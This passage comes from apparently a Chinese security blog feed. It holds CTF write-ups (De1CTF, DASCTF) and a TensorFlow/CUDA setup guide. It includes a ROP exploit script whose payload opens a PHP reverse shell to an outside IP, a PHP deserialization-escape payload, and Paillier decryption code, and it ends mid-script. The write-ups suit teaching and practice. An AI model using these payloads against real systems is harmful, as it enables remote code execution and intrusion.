<span class="number">2</span>:</span><br><span class="line">        print(<span class="string">'usage: &#123;&#125; path'</span>.format(sys.argv[<span class="number">0</span>]))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    exp = <span class="literal">False</span></span><br><span class="line">    debug = <span class="literal">False</span></span><br><span class="line">    filename = sys.argv[<span class="number">1</span>] <span class="comment">#Here input filename you want to read</span></span><br><span class="line">    <span class="keyword">if</span> filename == <span class="string">'exp'</span> <span class="keyword">or</span> filename == <span class="string">'debug'</span>:</span><br><span class="line">        <span class="keyword">if</span> filename == <span class="string">'debug'</span>:</span><br><span class="line">            debug = <span class="literal">True</span></span><br><span class="line">            php_base = <span class="number">0x7f40b6ec3000</span></span><br><span class="line">            minclude_base = <span class="number">0x7f40b6eba000</span></span><br><span class="line">            libc_base = <span class="number">0x7f40b7fa0000</span></span><br><span class="line">        orig_ret = <span class="number">0x7f546d151ac0</span></span><br><span class="line">        pop_rdi = php_base + <span class="number">0x000000000014b260</span> <span class="comment"># pop rdi ; ret </span></span><br><span class="line">        php_info = <span class="number">0x47bd10</span> - <span class="number">0x100000</span> + php_base</span><br><span class="line">        ret = php_base + <span class="number">0x14b261</span></span><br><span class="line">        jmp_rdi = php_base + <span class="number">0x000000000019f729</span> <span class="comment"># jmp rdi</span></span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            mov_to_rdi = <span class="number">0x00000000000494ea</span> + libc_base <span class="comment"># mov qword ptr [rdi], rsi ; ret</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mov_to_rdi = <span class="number">0x00000000000494e5</span> + libc_base <span class="comment"># mov eax, 1 ; mov qword ptr [rdi], rsi ; ret</span></span><br><span class="line">        pop_pop = <span class="number">0x000000000000135e</span> + minclude_base <span class="comment"># pop rbp ; pop r12 ; ret</span></span><br><span class="line">        pop_rsi = <span class="number">0x000000000002440e</span> + libc_base <span class="comment"># pop rsi ; ret</span></span><br><span class="line">        exp = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        system = libc_base + <span class="number">0x449c0</span></span><br><span class="line">        halt = p64(pop_rdi) + p64(jmp_rdi) + p64(jmp_rdi)</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr, val)</span>:</span></span><br><span class="line">            <span class="keyword">assert</span> len(val) == <span class="number">8</span></span><br><span class="line">            <span class="keyword">return</span> p64(pop_rdi) + p64(addr) + p64(pop_rsi) + val + p64(mov_to_rdi)</span><br><span class="line">        area = minclude_base + <span class="number">0x4000</span></span><br><span class="line">        cmd = <span class="string">b"php -r '$sock=fsockopen(\"118.178.180.118\",52333);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'"</span></span><br><span class="line">        cur = <span class="number">0</span></span><br><span class="line">        rop = <span class="string">b''</span></span><br><span class="line">        buf = cmd[:<span class="number">8</span>]</span><br><span class="line">        rop += write(area, buf)</span><br><span class="line">        cur += <span class="number">8</span></span><br><span class="line">        buf = cmd[<span class="number">8</span>:<span class="number">16</span>]</span><br><span class="line">        rop += write(area + <span class="number">8</span>, buf)</span><br><span class="line">        cur += <span class="number">8</span></span><br><span class="line">        rop += p64(pop_pop)</span><br><span class="line">        rop += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">        rop += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> cur &lt; len(cmd):</span><br><span class="line">            buf = cmd[cur: cur+<span class="number">8</span>]</span><br><span class="line">            <span class="keyword">if</span> len(buf) != <span class="number">8</span>:</span><br><span class="line">                buf = buf.ljust(<span class="number">8</span>, <span class="string">b'\0'</span>)</span><br><span class="line">            rop += write(area + cur, buf)</span><br><span class="line">            cur += <span class="number">8</span></span><br><span class="line"></span><br><span class="line">        rop += p64(pop_rdi)</span><br><span class="line">        rop += p64(area)</span><br><span class="line">        rop += p64(system)</span><br><span class="line">        rop += halt</span><br><span class="line">        filename = <span class="string">b'a'</span> * (<span class="number">0x88</span>) + rop</span><br><span class="line">    INITIAL += len(filename)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        save_filename = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        save_filename = os.path.basename(filename)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"search"</span>:filename,</span><br><span class="line">        <span class="string">"submit"</span>:<span class="string">"submit"</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#url = "http://134.175.185.244/select.php"</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        url = <span class="string">"http://localhost:51111/select.php"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#url = "http://49.51.251.99/select.php"</span></span><br><span class="line">        url = <span class="string">"http://134.175.185.244/select.php"</span></span><br><span class="line">    r = requests.post(url, data=data, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exp:</span><br><span class="line">        f = open(save_filename, <span class="string">"wb"</span>)</span><br><span class="line">        f.write(r.content[INITIAL:])</span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(r.content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>这题就先放一下把，需要慢慢消化。</p><h3 id="Misc-Chowder"><a href="#Misc-Chowder" class="headerlink" title="Misc Chowder"></a>Misc Chowder</h3><p>考察流量审计、压缩包密码爆破、NTFS流隐藏文件</p><h4 id="知识扩展"><a href="#知识扩展" class="headerlink" title="知识扩展"></a>知识扩展</h4><p>参考<a href="https://blog.csdn.net/alone_map/article/details/51851071">关于NTFS数据流及文件隐藏</a>：</p><blockquote><p>NTFS交换数据流（alternate data streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息，虽然我们无法看到数据流文件，但是它却是真实存在于我们的系统中的。创建一个数据交换流文件的方法很简单，命令为“宿主文件：准备与宿主文件关联的数据流文件”。</p></blockquote><p>利用这种数据流关联的方式，即可将一个文件的数据流关联到另一个文件上，这种方式下，目录下直接<code>dir</code>是看不到被关联的数据流的（当然被关联的原始文件肯定不在这个文件夹下），即实现了隐藏，不过<code>dir /r</code>可以将其列举出来。</p><h4 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h4><p>拿到题目，是一个流量包，流量审计发现进行了多次upload，利用wireshark<code>导出HTTP对象</code>可以将上传的文件导出：</p><p><img src="http://ggb0n.cool/images/de1ctf5.png" alt=""></p><p>在导出HTTP对象时，可以看到有7次upload的动作，每一组包含两个可导出的对象<code>upload_file.php</code>，注意观察，两个对象里一个是<code>multipart/form-data</code>一个是<code>text/html</code>的，显然前者是包含上传文件的数据的，将其导出，导出之后直接打开发现是上传文件时候的包数据，而不是php代码：</p><p><img src="http://ggb0n.cool/images/de1ctf6.png" alt=""></p><p>而且显然，图片的数据就在其中，那就简单了，010editor将数据处理下，只保留图片数据，再改后缀就行了嘛</p><p><img src="http://ggb0n.cool/images/de1ctf7.png" alt=""></p><p>一个资源的url，访问可以下载到一个<code>docx</code>的压缩包，解压打开是这个样子…</p><p><img src="http://ggb0n.cool/images/de1ctf8.png" alt=""></p><p>考虑到之前有的docx文件会隐藏压缩包，拖到解压工具里看看，还真有</p><p><img src="http://ggb0n.cool/images/de1ctf9.png" alt=""></p><p>但是需要密码，到这一步，题目也给出Hint：<code>压缩包密码暴破考点中，密码的长度为6位，前两位为DE</code><br>那就掩码爆破呗，上<code>ARCHPR</code>，设置成掩码模式，开始跑~</p><p><img src="http://ggb0n.cool/images/de1ctf10.png" alt=""></p><p>拿到密码<del>~</del></p><p>解压之后发现还是一张图，套娃了。。。</p><p>不过这个图拖到解压工具里又可以看到三个文件：</p><p><img src="http://ggb0n.cool/images/de1ctf11.png" alt=""></p><p><code>flag.txt</code>里的文件是假的，但是只要三个文件，图片中又提示<code>I AM FLAG</code>，试了其他办法也不行…<br>后来了解到，可能是利用了<code>NTFS</code>数据流来隐藏flag了，Windows下列举解压出的目录试试：</p><p><img src="http://ggb0n.cool/images/de1ctf12.png" alt=""></p><p>果然存在隐藏的NTFS流，将<code>fffffffflllll.txt</code>的内容关联到了<code>666.jpg</code>里，这样，其实用notepad读取<code>666.jpg:fffffffflllll.txt</code>就可以了</p><p><img src="http://ggb0n.cool/images/de1ctf13.png" alt=""></p><p><em>成长路上，要学的还很多</em></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个比赛太考工作量，个人感觉知识量也比较大，另外De1ta的师傅们原来这么爱玩MC啊🤔，写一下几个题的题解，主要记录一下学到的东西。
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="比赛划水" scheme="http://ggb0n.cool/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"/>
    
    
      <category term="SQL注入" scheme="http://ggb0n.cool/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="文件上传" scheme="http://ggb0n.cool/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
      <category term="htaccess解析" scheme="http://ggb0n.cool/tags/htaccess%E8%A7%A3%E6%9E%90/"/>
    
      <category term="NTFS数据流隐藏" scheme="http://ggb0n.cool/tags/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E8%97%8F/"/>
    
      <category term="NTFS特性上传绕过" scheme="http://ggb0n.cool/tags/NTFS%E7%89%B9%E6%80%A7%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"/>
    
      <category term="域渗透" scheme="http://ggb0n.cool/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
      <category term="CVE" scheme="http://ggb0n.cool/tags/CVE/"/>
    
      <category term="CVE-2014-6324域控提权" scheme="http://ggb0n.cool/tags/CVE-2014-6324%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>深度学习环境配置</title>
    <link href="http://ggb0n.cool/2020/05/01/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <id>http://ggb0n.cool/2020/05/01/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</id>
    <published>2020-05-01T15:23:59.000Z</published>
    <updated>2020-05-01T16:16:44.581Z</updated>
    
    <content type="html"><![CDATA[<p>之前一段时间，一直在用CPU跑算法训练自己的模型，今天突然意识到是支持GPU的啊，又快又省资源，不用它不是傻吗…🙄    <a id="more"></a></p><p>下面记录一下如何配置<code>TensorFlow-gpu + CUDA + Keras</code>实现GPU训练深度学习算法的模型。</p><h3 id="一些简介"><a href="#一些简介" class="headerlink" title="一些简介"></a>一些简介</h3><p>关于<a href="https://www.tensorflow.org/">TensorFlow</a>：</p><blockquote><p>TensorFlow 是一个端到端开源机器学习平台。它拥有一个全面而灵活的生态系统，其中包含各种工具、库和社区资源，可助力研究人员推动先进机器学习技术的发展，并使开发者能够轻松地构建和部署由机器学习提供支持的应用。</p></blockquote><p>关于<a href="https://keras.io/">Keras</a>：</p><blockquote><p>Keras是用Python编写的高级神经网络API，能够在TensorFlow，<a href="https://github.com/Microsoft/cntk">CNTK</a>或<a href="https://github.com/Theano/Theano">Theano</a>之上运行。它的开发着眼于实现快速实验。能够以最小的延迟将想法付诸实践是进行良好研究的关键。</p><ul><li>允许轻松快速地进行原型制作（通过用户友好性，模块化和可扩展性）。</li><li>支持卷积网络和循环网络，以及两者的组合。</li><li>在CPU和GPU上无缝运行。</li></ul></blockquote><p>关于<a href="https://developer.nvidia.com/">CUDA</a>：</p><blockquote><p>CUDA(ComputeUnified Device Architecture)，是显卡厂商NVIDIA推出的运算平台。 CUDA是一种由NVIDIA推出的通用并行计算架构，该架构使GPU能够解决复杂的计算问题。</p></blockquote><p>关于<a href="https://docs.nvidia.com/deeplearning/sdk/cudnn-install/">cuDNN</a>：</p><blockquote><p>NVIDIA cuDNN是用于深度神经网络的GPU加速库。它强调性能、易用性和低内存开销。NVIDIA cuDNN可以集成到更高级别的机器学习框架中，如谷歌的Tensorflow、加州大学伯克利分校的流行caffe软件。简单的插入式设计可以让开发人员专注于设计和实现神经网络模型，而不是简单调整性能，同时还可以在GPU上实现高性能现代并行计算。</p></blockquote><p>关于CUDA + cuDNN的组合：</p><blockquote><p>CUDA看作是一个工作台，上面配有很多工具，如锤子、螺丝刀等。cuDNN是基于CUDA的深度学习GPU加速库，有了它才能在GPU上完成深度学习的计算。它就相当于工作的工具，比如它就是个扳手。但是CUDA这个工作台买来的时候，并没有送扳手。想要在CUDA上运行深度神经网络，就要安装cuDNN，就像你想要拧个螺帽就要把扳手买回来。这样才能使GPU进行深度神经网络的工作，工作速度相较CPU快很多。</p></blockquote><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>通过今天踩的坑，提醒近期如果需要用tensorflow+cuda实现GPU运算的话，最好安装<code>tensorflow-gpu-2.0.0</code>和<code>duca-10.0</code>，或者更低的版本，具体可以参考官网各版本对应的信息。</p><h4 id="安装tensorflow"><a href="#安装tensorflow" class="headerlink" title="安装tensorflow"></a>安装tensorflow</h4><p>python下直接转<code>tensorflow-gpu</code>的库即可，哦！<code>python3</code>的版本一定要在<code>3.7</code>之下哦，还有一定要<code>64bit</code>的…</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -m pip install tensorflow-gpu==<span class="number">2.0</span><span class="number">.0</span></span><br><span class="line"><span class="comment"># 或者用国内镜像源加速安装</span></span><br><span class="line">python3 -m pip install tensorflow-gpu==<span class="number">2.0</span><span class="number">.0</span> -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><h4 id="安装Keras"><a href="#安装Keras" class="headerlink" title="安装Keras"></a>安装Keras</h4><p>python直接装库</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -m pip install keras</span><br></pre></td></tr></table></figure><h4 id="安装配置DUCA"><a href="#安装配置DUCA" class="headerlink" title="安装配置DUCA"></a>安装配置DUCA</h4><p>这里装的tensorflow是<code>2.0.0</code>版本，因此duca需要<code>10.0</code>版本，可以去官网下载<a href="https://developer.nvidia.com/cuda-10.0-download-archive">v10.0</a>，选择<code>exe(local)</code>，可以直接完整化安装。</p><p>下载之后运行安装程序，如果不想麻烦直接默认<code>简易</code>安装即可，安装完毕之后可以测试一下，可能反馈如下信息：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import tensorflow</span><br><span class="line"><span class="number">2020</span>-<span class="number">04</span>-<span class="number">07</span> <span class="number">16</span>:<span class="number">00</span>:<span class="number">12</span>.<span class="number">823507</span>: W tensorflow/stream_executor/platform/default/dso_loader.cc:<span class="number">55</span>] Could <span class="keyword">not</span> load dynamic library 'cudart64_100.dll'; dlerror: cudart64_101.dll <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure><p>也就是说缺少了<code>cudart64_100.dll</code>这个动态链接库，可以去<a href="https://cn.dll-files.com/download/f0ab3cac7e90959a38e97b262ebdf3f2/cudart64_100.dll.html?c=MGJjSTdyU1pLWWlGT0FNbmRlWEozUT09">这里</a>下载，下载完之后，将解压得到的文件放入<code>C:\Windows\System32</code>目录下，不过配置并未完成，因为<code>cuDNN</code>还未安装配置。</p><h4 id="配置cuDNN"><a href="#配置cuDNN" class="headerlink" title="配置cuDNN"></a>配置cuDNN</h4><p><a href="https://developer.nvidia.com/rdp/form/cudnn-download-survey">官网</a>下载与duca对应版本的cuDNN，不过首先需要注册、登录、完成一个小调查问卷，也不复杂的。</p><p>下载完毕之后，将压缩包里的内容放入CUDA安装的目录<code>C:\ProgramData\NVIDIA Corporation\CUDA Samples\v10.0</code>，如图：</p><p><img src="http://ggb0n.cool/images/cudnn.png" alt=""></p><p>同时需要将<code>cudnn64_7.dll</code>放入<code>C:\Windows\System32</code>下，不然可能仍然找不到该dll。</p><p>此时再去测试，应该就没问题了，可以用如下语句测试：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; a = tf.test.is_built_with_cuda()  # 判断CUDA是否可以用</span><br><span class="line">&gt;&gt;&gt; b = tf.test.is_gpu_available(</span><br><span class="line">...     cuda_only=False,</span><br><span class="line">...     min_cuda_compute_capability=None</span><br><span class="line">... )                                  # 判断GPU是否可以用</span><br></pre></td></tr></table></figure><p>成功配置的效果如下图：</p><p><img src="http://ggb0n.cool/images/test1.png" alt=""></p><p>反馈如上信息，则表明配置已经成功，再次跑算法就是GPU了，又快又拉风~</p><h3 id="问题及解决"><a href="#问题及解决" class="headerlink" title="问题及解决"></a>问题及解决</h3><p>在自己配置的时候，远远没有上面说的这么简单，起初直接默认装了<code>tensorflow</code>，结果是最新版<code>2.1.0</code>的，查了一下，也就安装了<code>cuda10.2</code>的版本，结果报错找不到<code>cudart64_100.dll</code>，去上面提供的链接库的下载地址找到安装就行了，然而问题并没有那么简单，在配置好cuDNN之后，用前面的方法进行测试，一直报错：</p><p><code>cudaGetDevice() failed. Status: cudaGetErrorString symbol not found.</code></p><p>这是什么问题呢？</p><p>网上还有人说是NVIDIA驱动版本的问题，在控制面板看了一下，我的是<code>441</code>，已经满足要求了…</p><p>有人说<code>tensorflow-2.1.0</code>要和<code>duca-10.1</code>配合着用，结果还是很不OK…应该是新版本存在的问题，毕竟连tensorflow目前都并未支持python3的各个版本…</p><p>最后，姑且直接将tensorflow换成了<code>tensorflow-2.0.0</code>的版本，也就是前面安装步骤里讲到的，然后再配合安装<code>duca-10.0</code>进行配置，终于成功解决了问题。😎</p><p><em>希望这篇文章能够帮助到你</em></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前一段时间，一直在用CPU跑算法训练自己的模型，今天突然意识到是支持GPU的啊，又快又省资源，不用它不是傻吗…🙄
    
    </summary>
    
    
      <category term="机器学习" scheme="http://ggb0n.cool/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Deep Learning" scheme="http://ggb0n.cool/tags/Deep-Learning/"/>
    
      <category term="GPU calculation" scheme="http://ggb0n.cool/tags/GPU-calculation/"/>
    
  </entry>
  
  <entry>
    <title>安恒月赛DASCTF</title>
    <link href="http://ggb0n.cool/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9BDSACTF/"/>
    <id>http://ggb0n.cool/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9BDSACTF/</id>
    <published>2020-04-25T07:07:29.000Z</published>
    <updated>2020-05-13T03:10:14.591Z</updated>
    
    <content type="html"><![CDATA[<p>中午就睡了一会儿起来做题，还被室友给diss了…🙄，搞得下午一直恍恍惚惚… 也做了几道题，简单写下题解吧，师傅们勿捶。。。<a id="more"></a></p><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>考察反序列化逃逸，类似的题之前有写过：<a href="http://ggb0n.cool/2020/02/07/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A0/#0CTF-2016-piapiapia">0CTF2019-piapiapia</a>、<a href="http://ggb0n.cool/2020/02/21/ichunqiu%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9B-WriteUp/#babyPHP">春秋公益赛</a>，这里不再详细解释。</p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>进入题目给出源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="string">"index.php"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="string">'gqy'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $c = <span class="string">'a'</span>.<span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//flag.php</span></span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'nice'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($_GET[<span class="string">'a'</span>],$_GET[<span class="string">'b'</span>]);</span><br><span class="line"><span class="comment">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span></span><br><span class="line">$b = unserialize(read(write(serialize($a))));</span><br></pre></td></tr></table></figure><p>根据字符替换的规则可以构造payload如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>&amp;b=a<span class="string">";s:8:"</span>password<span class="string">";O:1:"</span><span class="string">B":1:&#123;s:1:"</span><span class="string">b";O:1:"</span>C<span class="string">":1:&#123;s:1:"</span>c<span class="string">";s:8:"</span>flag.php<span class="string">";&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>payload打过去之后看源码拿到flag。</p><h3 id="cry1-not-RSA"><a href="#cry1-not-RSA" class="headerlink" title="cry1-not RSA"></a>cry1-not RSA</h3><p>这题考察Paillier加密算法，这题也是学到了新知识：</p><blockquote><p>Paillier加密系统，是1999年Paillier发明的概率公钥加密系统。基于复合剩余类的困难问题。该加密算法是一种同态加密，满足加法和数乘同态。</p></blockquote><p><a href="https://blog.b3ale.cn/2019/10/24/Python%E5%AE%9E%E7%8E%B0Paillier%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/">这篇博客</a>有对该算法的讲解，这里我就不过多讲解了。</p><h4 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h4><p>给出源码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">m = long2bytes(flag)</span><br><span class="line">n = p * q</span><br><span class="line">r = random.randint(<span class="number">1</span>,n)</span><br><span class="line">g = n + <span class="number">1</span></span><br><span class="line">c = (pow(g,m,n*n))*pow(r,n,n*n))%n*n</span><br><span class="line">...</span><br><span class="line"><span class="comment"># n=... c=...</span></span><br></pre></td></tr></table></figure><p>emmm… 其实做题的时候忘了把源码记下来了，就简单通过解密脚本逆了一下😅</p><p>通过密文c的产生明显看出来是Paillier算法进行加密的，既然如此，那么<code>n</code>应该是可以分解的，yafu分解了一下，果然可以。时间短，自己懒得写了解密脚本了，网上找了一个自己又改了一下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># paillier cryptosystem</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">L</span><span class="params">(x, n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (x - <span class="number">1</span>) // n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decipher</span><span class="params">(c, pk, sk)</span>:</span></span><br><span class="line">    [n, g] = pk</span><br><span class="line">    lmd = sk</span><br><span class="line">    u = gmpy2.invert(L(gmpy2.powmod(g, lmd, n ** <span class="number">2</span>), n), n) % n</span><br><span class="line">    m = L(gmpy2.powmod(c, lmd, n ** <span class="number">2</span>), n) * u % n</span><br><span class="line">    plaintext = libnum.n2s(m)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line">c = <span class="number">29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093</span></span><br><span class="line">g = n+<span class="number">1</span></span><br><span class="line">pk = [n,g]</span><br><span class="line"><span class="comment"># p、q由yafu分解而来</span></span><br><span class="line">p = <span class="number">80006336965345725157774618059504992841841040207998249416678435780577798937819</span></span><br><span class="line">q = <span class="number">80006336965345725157774618059504992841841040207998249416678435780577798937447</span></span><br><span class="line">sk = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">m = decipher(c, pk, sk)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><p>再赠送一个整个加密、解密实现的代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span><span class="params">(rs)</span>:</span></span><br><span class="line">    p = gmpy2.mpz_urandomb(rs, <span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> gmpy2.is_prime(p):</span><br><span class="line">        p = p + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">L</span><span class="params">(x, n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (x - <span class="number">1</span>) / n</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span><span class="params">()</span>:</span></span><br><span class="line">    rs = gmpy2.random_state(int(time.time()))</span><br><span class="line">    p = get_prime(rs)</span><br><span class="line">    q = get_prime(rs)</span><br><span class="line">    n = p * q</span><br><span class="line">    lmd = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    <span class="comment">#g = random.randint(1, n ** 2)</span></span><br><span class="line">    g = n + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> gmpy2.gcd(L(gmpy2.powmod(g, lmd, n ** <span class="number">2</span>), n), n) != <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'[!] g is not good enough'</span>)</span><br><span class="line">        exit()</span><br><span class="line">    pk = [n, g]</span><br><span class="line">    sk = lmd</span><br><span class="line">    <span class="keyword">return</span> pk, sk</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encipher</span><span class="params">(plaintext, pk)</span>:</span></span><br><span class="line">    m = libnum.s2n(plaintext)</span><br><span class="line">    n, g = pk</span><br><span class="line">    r = random.randint(<span class="number">1</span>, n ** <span class="number">2</span>)</span><br><span class="line">    c = gmpy2.powmod(g, m, n ** <span class="number">2</span>) * gmpy2.powmod(r, n, n ** <span class="number">2</span>) % (n ** <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decipher</span><span class="params">(c, pk, sk)</span>:</span></span><br><span class="line">    [n, g] = pk</span><br><span class="line">    lmd = sk</span><br><span class="line">    u = gmpy2.invert(L(gmpy2.powmod(g, lmd, n ** <span class="number">2</span>), n), n) % n</span><br><span class="line">    m = L(gmpy2.powmod(c, lmd, n ** <span class="number">2</span>), n) * u % n</span><br><span class="line">    plaintext = libnum.n2s(m)</span><br><span class="line">    <span 